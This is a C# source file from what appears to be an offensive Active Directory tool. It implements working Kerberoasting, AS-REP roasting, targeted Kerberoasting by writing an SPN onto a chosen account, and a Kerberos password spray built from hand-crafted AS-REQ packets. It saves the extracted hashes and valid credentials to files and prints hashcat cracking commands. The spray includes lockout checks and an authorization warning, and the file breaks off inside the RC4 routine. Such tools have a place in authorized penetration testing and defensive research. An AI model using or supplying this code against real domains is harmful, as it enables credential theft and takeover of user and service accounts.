using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace SpicyAD
{
    public static class KerberosAttacks
    {
        public static void Kerberoast()
        {
            Console.WriteLine("[*] Starting Kerberoasting Attack...\n");

            try
            {
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))";
                searcher.PropertiesToLoad.Add("samAccountName");
                searcher.PropertiesToLoad.Add("servicePrincipalName");
                searcher.PropertiesToLoad.Add("distinguishedName");
                searcher.PropertiesToLoad.Add("pwdLastSet");
                searcher.PageSize = 1000;

                SearchResultCollection results = searcher.FindAll();

                if (results.Count == 0)
                {
                    Console.WriteLine("[!] No users with SPNs found.");
                    return;
                }

                Console.WriteLine($"[+] Found {results.Count} user(s) with SPN(s):\n");

                List<string> hashcatHashes = new List<string>();

                foreach (SearchResult result in results)
                {
                    string samAccountName = result.Properties["samAccountName"][0].ToString();

                    // Skip krbtgt - not useful for Kerberoasting
                    if (samAccountName.Equals("krbtgt", StringComparison.OrdinalIgnoreCase))
                        continue;

                    string distinguishedName = result.Properties["distinguishedName"][0].ToString();

                    Console.WriteLine($"[+] User: {samAccountName}");
                    OutputHelper.Verbose($"    DN: {distinguishedName}");

                    if (result.Properties["servicePrincipalName"].Count > 0)
                    {
                        foreach (var spn in result.Properties["servicePrincipalName"])
                        {
                            OutputHelper.Verbose($"    SPN: {spn}");

                            // Request TGS for this SPN
                            string tgsHash = RequestTGS(spn.ToString(), samAccountName);
                            if (!string.IsNullOrEmpty(tgsHash))
                            {
                                hashcatHashes.Add(tgsHash);
                            }
                        }
                    }

                    OutputHelper.Verbose("");
                }

                if (hashcatHashes.Count > 0)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] TGS Hashes (Hashcat format):\n");

                    foreach (string hash in hashcatHashes)
                    {
                        Console.WriteLine(hash);
                    }
                    Console.ResetColor();

                    // Save to file
                    string filename = $"kerberoast_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
                    File.WriteAllLines(filename, hashcatHashes);
                    Console.WriteLine($"\n[+] Hashes saved to: {filename}");

                    // Show Hashcat commands based on encryption types found
                    ShowHashcatCommands(hashcatHashes, "kerberoast");
                }
                else
                {
                    Console.WriteLine("\n[!] No TGS hashes were extracted.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                Console.WriteLine($"[!] Stack Trace: {ex.StackTrace}");
            }
        }

        private static string RequestTGS(string spn, string userName)
        {
            try
            {
                // Use built-in Kerberos functionality to request TGS
                byte[] ticket = KerberosHelper.RequestServiceTicket(spn);

                if (ticket != null && ticket.Length > 0)
                {
                    // Parse the ticket and extract the hash
                    string hash = KerberosHelper.ParseTGSForHashcat(ticket, userName, spn);
                    return hash;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error requesting TGS for {spn}: {ex.Message}");
            }

            return null;
        }

        public static void ASREPRoast()
        {
            Console.WriteLine("[*] Starting AS-REP Roasting Attack...\n");

            try
            {
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
                searcher.PropertiesToLoad.Add("samAccountName");
                searcher.PropertiesToLoad.Add("distinguishedName");
                searcher.PageSize = 1000;

                SearchResultCollection results = searcher.FindAll();

                if (results.Count == 0)
                {
                    Console.WriteLine("[!] No users with DONT_REQ_PREAUTH found.");
                    return;
                }

                Console.WriteLine($"[+] Found {results.Count} user(s) with DONT_REQ_PREAUTH:\n");

                List<string> hashcatHashes = new List<string>();

                foreach (SearchResult result in results)
                {
                    string samAccountName = result.Properties["samAccountName"][0].ToString();
                    string distinguishedName = result.Properties["distinguishedName"][0].ToString();

                    Console.WriteLine($"[+] User: {samAccountName}");
                    OutputHelper.Verbose($"    DN: {distinguishedName}");

                    // Request AS-REP for this user
                    string asrepHash = RequestASREP(samAccountName);
                    if (!string.IsNullOrEmpty(asrepHash))
                    {
                        hashcatHashes.Add(asrepHash);
                    }

                    OutputHelper.Verbose("");
                }

                if (hashcatHashes.Count > 0)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] AS-REP Hashes (Hashcat format):\n");

                    foreach (string hash in hashcatHashes)
                    {
                        Console.WriteLine(hash);
                    }
                    Console.ResetColor();

                    // Save to file
                    string filename = $"asreproast_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
                    File.WriteAllLines(filename, hashcatHashes);
                    Console.WriteLine($"\n[+] Hashes saved to: {filename}");

                    // Show Hashcat commands based on encryption types found
                    ShowHashcatCommands(hashcatHashes, "asreproast");        
                }
                else
                {
                    Console.WriteLine("\n[!] No AS-REP hashes were extracted.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        
        /// Display Hashcat commands for cracking based on hash encryption type

        private static void ShowHashcatCommands(List<string> hashes, string attackType)
        {
            // Detect encryption types from hashes
            bool hasRC4 = false;      // etype 23
            bool hasAES128 = false;   // etype 17
            bool hasAES256 = false;   // etype 18

            foreach (string hash in hashes)
            {
                if (hash.Contains("$krb5tgs$23$") || hash.Contains("$krb5asrep$23$"))
                    hasRC4 = true;
                else if (hash.Contains("$krb5tgs$17$") || hash.Contains("$krb5asrep$17$"))
                    hasAES128 = true;
                else if (hash.Contains("$krb5tgs$18$") || hash.Contains("$krb5asrep$18$"))
                    hasAES256 = true;
            }

            Console.WriteLine("\n[*] Hashcat commands:");
            Console.ForegroundColor = ConsoleColor.Cyan;

            if (attackType == "kerberoast")
            {
                // Kerberoasting modes
                if (hasRC4)
                    Console.WriteLine("    hashcat -m 13100 -a 0 hashes.txt wordlist.txt   # RC4 (etype 23)");
                if (hasAES128)
                    Console.WriteLine("    hashcat -m 19600 -a 0 hashes.txt wordlist.txt   # AES-128 (etype 17)");
                if (hasAES256)
                    Console.WriteLine("    hashcat -m 19700 -a 0 hashes.txt wordlist.txt   # AES-256 (etype 18)");
            }
            else if (attackType == "asreproast")
            {
                // AS-REP Roasting modes
                if (hasRC4)
                    Console.WriteLine("    hashcat -m 18200 -a 0 hashes.txt wordlist.txt   # RC4 (etype 23)");
                if (hasAES128)
                    Console.WriteLine("    hashcat -m 19600 -a 0 hashes.txt wordlist.txt   # AES-128 (etype 17)");
                if (hasAES256)
                    Console.WriteLine("    hashcat -m 19700 -a 0 hashes.txt wordlist.txt   # AES-256 (etype 18)");
            }

            Console.ResetColor();
            Console.WriteLine("\n[*] Tip: Use -O for optimized kernels, -w 3 for high performance");
        }

        private static string RequestASREP(string userName)
        {
            try
            {
                byte[] asrep = KerberosHelper.RequestASREP(userName, AuthContext.DomainName);

                if (asrep != null && asrep.Length > 0)
                {
                    string hash = KerberosHelper.ParseASREPForHashcat(asrep, userName);
                    return hash;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error requesting AS-REP for {userName}: {ex.Message}");
            }

            return null;
        }

        public static void TargetedKerberoast()
        {
            Console.WriteLine("[*] Targeted Kerberoasting (SPN Write Attack)...\n");

            try
            {
                Console.Write("Enter target username: ");
                string targetUser = Console.ReadLine();

                Console.Write("Enter SPN to set (e.g., HTTP/target.domain.com): ");
                string spn = Console.ReadLine();

                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = $"(&(objectClass=user)(samAccountName={targetUser}))";
                searcher.PropertiesToLoad.Add("distinguishedName");
                searcher.PropertiesToLoad.Add("servicePrincipalName");

                SearchResult result = searcher.FindOne();

                if (result == null)
                {
                    Console.WriteLine($"[!] User {targetUser} not found.");
                    return;
                }

                string dn = result.Properties["distinguishedName"][0].ToString();
                OutputHelper.Verbose($"[*] Target DN: {dn}");

                   DirectoryEntry userEntry = AuthContext.GetDirectoryEntry($"LDAP://{dn}");

                bool spnAdded = false;

                      try
                {
                    if (!userEntry.Properties["servicePrincipalName"].Contains(spn))
                    {
                        userEntry.Properties["servicePrincipalName"].Add(spn);
                        userEntry.CommitChanges();

                        Console.WriteLine($"[+] Successfully set SPN: {spn}");
                        spnAdded = true;

                        OutputHelper.Verbose("[*] Waiting 5 seconds for replication...");
                        System.Threading.Thread.Sleep(5000);
                    }
                    else
                    {
                        Console.WriteLine($"[!] SPN {spn} already exists for this user.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error setting SPN: {ex.Message}");
                    return;
                }

                // ======================
                //      KERBEROAST
                // ======================
                OutputHelper.Verbose($"[*] Requesting TGS for {spn}...");
                string tgsHash = RequestTGS(spn, targetUser);

                if (!string.IsNullOrEmpty(tgsHash))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"\n[+] TGS Hash (Hashcat format):\n");
                    Console.WriteLine(tgsHash);
                    Console.ResetColor();

                    string filename = $"targeted_kerberoast_{targetUser}_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
                    File.WriteAllText(filename, tgsHash);
                    Console.WriteLine($"\n[+] Hash saved to: {filename}");
                }
                else
                {
                    Console.WriteLine("[!] Failed to request TGS.");
                }
                
                if (spnAdded)
                {
                    try
                    {
                        userEntry.Properties["servicePrincipalName"].Remove(spn);
                        userEntry.CommitChanges();

                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"\n[+] SPN removed successfully: {spn}");
                        Console.ResetColor();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[!] Error removing SPN: {ex.Message}");
                    }
                }

                Console.WriteLine("\n[*] Attack completed.\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }



        
        /// Safe Password Spray via Kerberos AS-REQ (like Rubeus brute)
        /// This method is SAFE because:
        /// 1. It checks badPwdCount for ALL users BEFORE spraying
        /// 2. Aborts if ANY user has badPwdCount >= X (to avoid lockouts)
        /// 3. Uses Kerberos pre-authentication (not LDAP bind) - same as Rubeus
        /// 4. Kerberos errors don't increment badPwdCount on some DCs (depending on config)
        public static void PasswordSpray()
        {
            Console.WriteLine("[*] Safe Password Spray via Kerberos\n");
            Console.WriteLine("[!] WARNING: This will attempt authentication against domain users.");
            Console.WriteLine("[!] Only use this with explicit authorization!\n");

            try
            {
                // First, show the lockout policy
                Console.WriteLine("[*] Checking domain lockout policy...\n");
                int lockoutThreshold = GetLockoutThreshold();

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("╔══════════════════════════════════════════════════════╗");
                Console.WriteLine("║           DOMAIN LOCKOUT POLICY                      ║");
                Console.WriteLine("╠══════════════════════════════════════════════════════╣");
                if (lockoutThreshold > 0)
                {
                    Console.WriteLine($"║  Lockout Threshold: {lockoutThreshold} bad password attempts".PadRight(55) + "║");
                    Console.WriteLine($"║  After {lockoutThreshold} failed attempts, accounts get LOCKED".PadRight(55) + "║");
                }
                else
                {
                    Console.WriteLine("║  Lockout Threshold: DISABLED (no limit)              ║");
                    Console.WriteLine("║  Accounts will NOT be locked on bad passwords        ║");
                }
                Console.WriteLine("╚══════════════════════════════════════════════════════╝");
                Console.ResetColor();
                Console.WriteLine();

                // Ask user for safety margin
                int safetyMargin = 2; // default
                if (lockoutThreshold > 0)
                {
                    Console.Write($"Enter safety margin (skip users with badPwdCount >= threshold - X) [default 2]: ");
                    string marginStr = Console.ReadLine()?.Trim();
                    if (!string.IsNullOrEmpty(marginStr) && int.TryParse(marginStr, out int userMargin) && userMargin >= 0)
                    {
                        safetyMargin = userMargin;
                    }
                    Console.WriteLine($"[*] Safety margin: {safetyMargin} (will skip users with badPwdCount >= {lockoutThreshold - safetyMargin})");
                }

                Console.Write("\nEnter password to spray: ");
                string password = Console.ReadLine()?.Trim();

                if (string.IsNullOrEmpty(password))
                {
                    Console.WriteLine("[!] Password cannot be empty.");
                    return;
                }

                Console.Write("Enter delay between attempts in ms (default 0, recommended 100-500): ");
                string delayStr = Console.ReadLine()?.Trim();
                int delay = 0;
                if (!string.IsNullOrEmpty(delayStr))
                {
                    int.TryParse(delayStr, out delay);
                }

                PasswordSpray(password, delay, safetyMargin);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        
        /// Safe Password Spray via Kerberos AS-REQ (programmatic)
        public static void PasswordSpray(string password, int delayMs = 0, int safetyMargin = 2)
        {
            Console.WriteLine("[*] Safe Password Spray via Kerberos\n");

            try
            {
                // Step 1: Get lockout policy
                Console.WriteLine("[*] Step 1: Checking domain lockout policy...\n");

                int lockoutThreshold = GetLockoutThreshold();
                int safeThreshold = lockoutThreshold > 0 ? Math.Max(1, lockoutThreshold - safetyMargin) : 1;

                if (lockoutThreshold > 0)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"[+] Lockout threshold: {lockoutThreshold} attempts");
                    Console.ResetColor();
                    Console.WriteLine($"[*] Safety threshold: Will skip users with badPwdCount >= {safeThreshold}");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] No lockout policy configured (threshold = 0)");
                    Console.ResetColor();
                    Console.WriteLine("[*] Safety threshold: Will skip users with badPwdCount >= 1");
                }

                // Warning about Entra ID / Azure AD Connect
                Console.WriteLine();
                Console.WriteLine("[!] NOTE: If Azure AD Connect with Pass-Through Authentication is in use,");
                Console.WriteLine("[!] Entra Smart Lockout may apply instead of AD lockout policies.");
                Console.WriteLine();

                // Step 2: Get all enabled users (we'll check badPwdCount individually before each spray)
                Console.WriteLine("[*] Step 2: Enumerating enabled domain users...\n");

                List<string> allUsers = new List<string>();

                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = "(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
                searcher.PropertiesToLoad.Add("samAccountName");
                searcher.PageSize = 1000;
                // Don't cache - we want fresh results
                searcher.CacheResults = false;

                SearchResultCollection results = searcher.FindAll();

                foreach (SearchResult result in results)
                {
                    string samAccountName = result.Properties["samAccountName"][0].ToString();

                    // Skip computer accounts
                    if (samAccountName.EndsWith("$"))
                        continue;

                    // Skip built-in accounts
                    if (samAccountName.Equals("krbtgt", StringComparison.OrdinalIgnoreCase) ||
                        samAccountName.Equals("Guest", StringComparison.OrdinalIgnoreCase))
                        continue;

                    allUsers.Add(samAccountName);
                }

                Console.WriteLine($"[+] Found {allUsers.Count} enabled users\n");

                if (allUsers.Count == 0)
                {
                    Console.WriteLine("[!] No users to spray.");
                    return;
                }

                // Step 3: Check current badPwdCount status for all users
                Console.WriteLine("[*] Step 3: Checking badPwdCount for all users (fresh query)...\n");

                var userBadPwdCount = GetAllUsersBadPwdCount();

                int safeCount = 0;
                int riskyCount = 0;
                List<string> riskyUsers = new List<string>();

                foreach (string user in allUsers)
                {
                    int badPwd = userBadPwdCount.ContainsKey(user.ToLower()) ? userBadPwdCount[user.ToLower()] : 0;
                    if (badPwd >= safeThreshold)
                    {
                        riskyCount++;
                        riskyUsers.Add($"{user} (badPwdCount={badPwd})");
                    }
                    else
                    {
                        safeCount++;
                    }
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] Safe users (badPwdCount < {safeThreshold}): {safeCount}");
                Console.ResetColor();
                if (riskyCount > 0)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                Console.WriteLine($"[+] Risky users (badPwdCount >= {safeThreshold}): {riskyCount}");
                Console.ResetColor();

                if (riskyCount > 0)
                {
                    Console.WriteLine("\n[!] WARNING: The following users already have failed login attempts:\n");
                    foreach (string user in riskyUsers.Take(20))
                    {
                        Console.WriteLine($"    - {user}");
                    }
                    if (riskyUsers.Count > 20)
                    {
                        Console.WriteLine($"    ... and {riskyUsers.Count - 20} more");
                    }
                    Console.WriteLine("\n[*] These users will be SKIPPED to prevent lockouts.");
                }

                if (safeCount == 0)
                {
                    Console.WriteLine("\n[!] No safe users to spray. All users have badPwdCount >= threshold.");
                    Console.WriteLine("[!] Wait for badPwdCount to reset before spraying.");
                    return;
                }

                Console.Write($"\n[?] Continue spraying {safeCount} safe users? (y/N): ");
                string confirm = Console.ReadLine()?.Trim().ToLower();
                if (confirm != "y" && confirm != "yes")
                {
                    Console.WriteLine("[*] Spray aborted.");
                    return;
                }

                // Step 4: Perform the spray with real-time badPwdCount checking
                Console.WriteLine($"\n[*] Step 4: Spraying via Kerberos AS-REQ...\n");

                string kdcHost = GetKdcHost();
                if (string.IsNullOrEmpty(kdcHost))
                {
                    Console.WriteLine("[!] Could not determine KDC host.");
                    return;
                }
                Console.WriteLine($"[+] Using KDC: {kdcHost}\n");

                List<string> validCredentials = new List<string>();
                int testedCount = 0;
                int skippedCount = 0;

                foreach (string username in allUsers)
                {
                    // IMPORTANT: Check badPwdCount FRESH before EACH attempt
                    int currentBadPwd = GetUserBadPwdCount(username);

                    if (currentBadPwd >= safeThreshold)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[!] SKIP {username}: badPwdCount={currentBadPwd} (>= threshold {safeThreshold})");
                        Console.ResetColor();
                        skippedCount++;
                        continue;
                    }

                    testedCount++;
                    OutputHelper.Verbose($"[*] Testing {testedCount}: {username} (badPwdCount={currentBadPwd})");

                    KerberosAuthResult authResult = TryKerberosAuth(kdcHost, AuthContext.DomainName, username, password);

                    switch (authResult)
                    {
                        case KerberosAuthResult.Success:
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[+] VALID: {AuthContext.DomainName}\\{username}:{password}");
                            Console.ResetColor();
                            validCredentials.Add($"{AuthContext.DomainName}\\{username}:{password}");
                            break;

                        case KerberosAuthResult.PasswordExpired:
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[+] VALID (pwd expired): {AuthContext.DomainName}\\{username}:{password}");
                            Console.ResetColor();
                            validCredentials.Add($"{AuthContext.DomainName}\\{username}:{password} [PASSWORD EXPIRED]");
                            break;

                        case KerberosAuthResult.AccountDisabled:
                            OutputHelper.Verbose($"[-] {username}: Account disabled");
                            break;

                        case KerberosAuthResult.AccountLocked:
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"[!] {username}: Account LOCKED OUT - stopping spray!");
                            Console.WriteLine("[!] Spray aborted to prevent further lockouts.");
                            Console.ResetColor();
                            goto EndSpray;

                        case KerberosAuthResult.InvalidCredentials:
                        case KerberosAuthResult.PreAuthRequired:
                            OutputHelper.Verbose($"[-] {username}: Invalid password");
                            // Check if badPwdCount increased after failed attempt
                            int newBadPwd = GetUserBadPwdCount(username);
                            if (newBadPwd > currentBadPwd)
                            {
                                OutputHelper.Verbose($"[*] {username}: badPwdCount increased {currentBadPwd} -> {newBadPwd}");
                                // Warn if approaching lockout
                                if (lockoutThreshold > 0 && newBadPwd >= safeThreshold)
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine($"[!] WARNING: {username} badPwdCount={newBadPwd} (approaching lockout!)");
                                    Console.ResetColor();
                                }
                            }
                            break;

                        case KerberosAuthResult.Error:
                            OutputHelper.Verbose($"[-] {username}: Error during authentication");
                            break;
                    }

                    if (delayMs > 0)
                    {
                        System.Threading.Thread.Sleep(delayMs);
                    }
                }

            EndSpray:
                Console.WriteLine($"\n[*] Spray complete.");
                Console.WriteLine($"[*] Tested: {testedCount} users");
                Console.WriteLine($"[*] Skipped (badPwdCount too high): {skippedCount} users");

                if (validCredentials.Count > 0)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"\n[+] Found {validCredentials.Count} valid credential(s):\n");
                    foreach (string cred in validCredentials)
                    {
                        Console.WriteLine($"    {cred}");
                    }
                    Console.ResetColor();

                    // Save to file
                    string filename = $"spray_valid_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
                    File.WriteAllLines(filename, validCredentials);
                    Console.WriteLine($"\n[+] Valid credentials saved to: {filename}");
                }
                else
                {
                    Console.WriteLine("\n[-] No valid credentials found.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                OutputHelper.Verbose($"[!] Stack trace: {ex.StackTrace}");
            }
        }

        private enum KerberosAuthResult
        {
            Success,
            InvalidCredentials,
            PreAuthRequired,
            AccountDisabled,
            AccountLocked,
            PasswordExpired,
            Error
        }

        
        /// Try Kerberos authentication via AS-REQ (like Rubeus brute)
        private static KerberosAuthResult TryKerberosAuth(string kdcHost, string domain, string username, string password)
        {
            try
            {
                // Build AS-REQ with PA-ENC-TIMESTAMP (pre-authentication)
                byte[] asReq = BuildAsReqWithPreAuth(domain, username, password);

                // Send to KDC
                byte[] response = SendToKdc(kdcHost, 88, asReq);

                if (response == null || response.Length == 0)
                {
                    return KerberosAuthResult.Error;
                }

                // Parse response
                return ParseKdcResponse(response);
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] Auth error for {username}: {ex.Message}");
                return KerberosAuthResult.Error;
            }
        }

        
        /// Build AS-REQ with PA-ENC-TIMESTAMP pre-authentication
        private static byte[] BuildAsReqWithPreAuth(string domain, string username, string password)
        {
            string realm = domain.ToUpper();

            // Build timestamp for PA-ENC-TIMESTAMP
            DateTime now = DateTime.UtcNow;
            byte[] timestamp = BuildPaEncTimestamp(now);

            // Encrypt timestamp with user's key (derived from password)
            byte[] userKey = DeriveKeyFromPassword(password, realm, username);
            byte[] encryptedTimestamp = RC4Encrypt(userKey, timestamp, 1); // key usage 1 for PA-ENC-TIMESTAMP

            // Build PA-ENC-TIMESTAMP
            byte[] paEncTimestamp = BuildPaData(2, encryptedTimestamp); // PA-ENC-TIMESTAMP = 2

            // Build PA-PAC-REQUEST
            byte[] paPacRequest = BuildPaPacRequest(true);

            // Build KDC-REQ-BODY
            byte[] reqBody = BuildKdcReqBody(realm, username);

            // Build full AS-REQ
            List<byte> asReq = new List<byte>();

            // AS-REQ ::= [APPLICATION 10] KDC-REQ
            List<byte> kdcReq = new List<byte>();

            // pvno [1] INTEGER (5)
            kdcReq.AddRange(BuildContextTag(1, BuildInteger(5)));

            // msg-type [2] INTEGER (10 for AS-REQ)
            kdcReq.AddRange(BuildContextTag(2, BuildInteger(10)));

            // padata [3] SEQUENCE OF PA-DATA
            List<byte> padataSeq = new List<byte>();
            padataSeq.AddRange(paEncTimestamp);
            padataSeq.AddRange(paPacRequest);
            kdcReq.AddRange(BuildContextTag(3, BuildSequence(padataSeq.ToArray())));

            // req-body [4] KDC-REQ-BODY
            kdcReq.AddRange(BuildContextTag(4, reqBody));

            byte[] kdcReqBytes = BuildSequence(kdcReq.ToArray());

            // Wrap in APPLICATION 10
            asReq.Add(0x6A); // APPLICATION 10
            asReq.AddRange(BuildLength(kdcReqBytes.Length));
            asReq.AddRange(kdcReqBytes);

            return asReq.ToArray();
        }

        private static byte[] BuildPaEncTimestamp(DateTime time)
        {
            // PA-ENC-TS-ENC ::= SEQUENCE {
            //     patimestamp [0] KerberosTime,
            //     pausec [1] Microseconds OPTIONAL
            // }
            List<byte> paEncTs = new List<byte>();

            // patimestamp [0]
            string timeStr = time.ToString("yyyyMMddHHmmss") + "Z";
            byte[] timeBytes = Encoding.ASCII.GetBytes(timeStr);

            List<byte> genTime = new List<byte>();
            genTime.Add(0x18); // GeneralizedTime
            genTime.Add((byte)timeBytes.Length);
            genTime.AddRange(timeBytes);

            paEncTs.AddRange(BuildContextTag(0, genTime.ToArray()));

            return BuildSequence(paEncTs.ToArray());
        }

        private static byte[] BuildPaData(int paDataType, byte[] paDataValue)
        {
            // PA-DATA ::= SEQUENCE {
            //     padata-type [1] INTEGER,
            //     padata-value [2] OCTET STRING
            // }
            List<byte> padata = new List<byte>();

            // padata-type [1]
            padata.AddRange(BuildContextTag(1, BuildInteger(paDataType)));

            // padata-value [2] - wrapped in EncryptedData for PA-ENC-TIMESTAMP
            if (paDataType == 2) // PA-ENC-TIMESTAMP
            {
                // EncryptedData ::= SEQUENCE {
                //     etype [0] INTEGER,
                //     cipher [2] OCTET STRING
                // }
                List<byte> encData = new List<byte>();
                encData.AddRange(BuildContextTag(0, BuildInteger(23))); // RC4-HMAC
                encData.AddRange(BuildContextTag(2, BuildOctetString(paDataValue)));

                padata.AddRange(BuildContextTag(2, BuildOctetString(BuildSequence(encData.ToArray()))));
            }
            else
            {
                padata.AddRange(BuildContextTag(2, BuildOctetString(paDataValue)));
            }

            return BuildSequence(padata.ToArray());
        }

        private static byte[] BuildPaPacRequest(bool includePac)
        {
            // PA-PAC-REQUEST ::= SEQUENCE {
            //     include-pac [0] BOOLEAN
            // }
            List<byte> pacReq = new List<byte>();

            byte[] boolVal = new byte[] { 0x01, 0x01, (byte)(includePac ? 0xFF : 0x00) };
            pacReq.AddRange(BuildContextTag(0, boolVal));

            byte[] pacReqSeq = BuildSequence(pacReq.ToArray());

            return BuildPaData(128, pacReqSeq); // PA-PAC-REQUEST = 128
        }

        private static byte[] BuildKdcReqBody(string realm, string username)
        {
            // KDC-REQ-BODY ::= SEQUENCE {
            //     kdc-options [0] KDCOptions,
            //     cname [1] PrincipalName,
            //     realm [2] Realm,
            //     sname [3] PrincipalName,
            //     till [5] KerberosTime,
            //     nonce [7] UInt32,
            //     etype [8] SEQUENCE OF Int32
            // }
            List<byte> body = new List<byte>();

            // kdc-options [0] - forwardable, renewable, canonicalize
            byte[] kdcOptions = new byte[] { 0x03, 0x05, 0x00, 0x50, 0x80, 0x00, 0x00 }; // BIT STRING
            body.AddRange(BuildContextTag(0, kdcOptions));

            // cname [1] - client principal name
            body.AddRange(BuildContextTag(1, BuildPrincipalName(1, username))); // NT-PRINCIPAL = 1

            // realm [2]
            body.AddRange(BuildContextTag(2, BuildGeneralString(realm)));

            // sname [3] - service principal name (krbtgt/REALM)
            body.AddRange(BuildContextTag(3, BuildPrincipalName(2, "krbtgt", realm))); // NT-SRV-INST = 2

            // till [5] - ticket expiration
            string tillTime = DateTime.UtcNow.AddYears(10).ToString("yyyyMMddHHmmss") + "Z";
            byte[] tillBytes = Encoding.ASCII.GetBytes(tillTime);
            List<byte> tillGenTime = new List<byte>();
            tillGenTime.Add(0x18); // GeneralizedTime
            tillGenTime.Add((byte)tillBytes.Length);
            tillGenTime.AddRange(tillBytes);
            body.AddRange(BuildContextTag(5, tillGenTime.ToArray()));

            // nonce [7]
            Random rnd = new Random();
            int nonce = rnd.Next();
            body.AddRange(BuildContextTag(7, BuildInteger(nonce)));

            // etype [8] - supported encryption types (RC4-HMAC)
            List<byte> etypes = new List<byte>();
            etypes.AddRange(BuildInteger(23)); // RC4-HMAC
            etypes.AddRange(BuildInteger(18)); // AES256-CTS-HMAC-SHA1
            etypes.AddRange(BuildInteger(17)); // AES128-CTS-HMAC-SHA1
            body.AddRange(BuildContextTag(8, BuildSequence(etypes.ToArray())));

            return BuildSequence(body.ToArray());
        }

        private static byte[] BuildPrincipalName(int nameType, params string[] names)
        {
            // PrincipalName ::= SEQUENCE {
            //     name-type [0] Int32,
            //     name-string [1] SEQUENCE OF KerberosString
            // }
            List<byte> principal = new List<byte>();

            // name-type [0]
            principal.AddRange(BuildContextTag(0, BuildInteger(nameType)));

            // name-string [1]
            List<byte> nameSeq = new List<byte>();
            foreach (string name in names)
            {
                nameSeq.AddRange(BuildGeneralString(name));
            }
            principal.AddRange(BuildContextTag(1, BuildSequence(nameSeq.ToArray())));

            return BuildSequence(principal.ToArray());
        }

        private static byte[] DeriveKeyFromPassword(string password, string realm, string username)
        {
            // RC4-HMAC key derivation: key = MD4(UTF16-LE(password))
            // This is the NTLM hash
            byte[] passwordBytes = Encoding.Unicode.GetBytes(password);

            var md4 = new MD4();
            return md4.ComputeHash(passwordBytes);
        }

        private static byte[] RC4Encrypt(byte[] key, byte[] data, int keyUsage)
        {
            // Kerberos RC4-HMAC encryption
            // K1 = HMAC-MD5(key, keyUsage)
            // K2 = HMAC-MD5(K1, confounder)
            // checksum = HMAC-MD5(K1, confounder + plaintext)
            // ciphertext = RC4(K2, confounder + plaintext)
            // result = checksum + ciphertext

            byte[] confounder = new byte[8];
            new Random().NextBytes(confounder);

            // K1 = HMAC-MD5(key, keyUsage as little-endian int32)
            byte[] keyUsageBytes = BitConverter.GetBytes(keyUsage);
            byte[] k1;
            using (var hmac = new System.Security.Cryptography.HMACMD5(key))
            {
                k1 = hmac.ComputeHash(keyUsageBytes);
            }

            // plaintext = confounder + data
            byte[] plaintext = new byte[confounder.Length + data.Length];
            Array.Copy(confounder, 0, plaintext, 0, confounder.Length);
            Array.Copy(data, 0, plaintext, confounder.Length, data.Length);

            // checksum = HMAC-MD5(K1, plaintext)
            byte[] checksum;
            using (var hmac = new System.Security.Cryptography.HMACMD5(k1))
            {
                checksum = hmac.ComputeHash(plaintext);
            }

            // K2 = HMAC-MD5(K1, checksum)
            byte[] k2;
            using (var hmac = new System.Security.Cryptography.HMACMD5(k1))
            {
                k2 = hmac.ComputeHash(checksum);
            }

            // ciphertext = RC4(K2, plaintext)
            byte[] ciphertext = RC4(k2, plaintext);

            // result = checksum + ciphertext
            byte[] result = new byte[checksum.Length + ciphertext.Length];
            Array.Copy(checksum, 0, result, 0, checksum.Length);
            Array.Copy(ciphertext, 0, result, checksum.Length, ciphertext.Length);

            return result;
        }

        private static byte[] RC4(byte[] key, byte[] data)
        {
            byte[] s = new byte[256];
            byte[] result = new byte[data.Length];

            // KSA
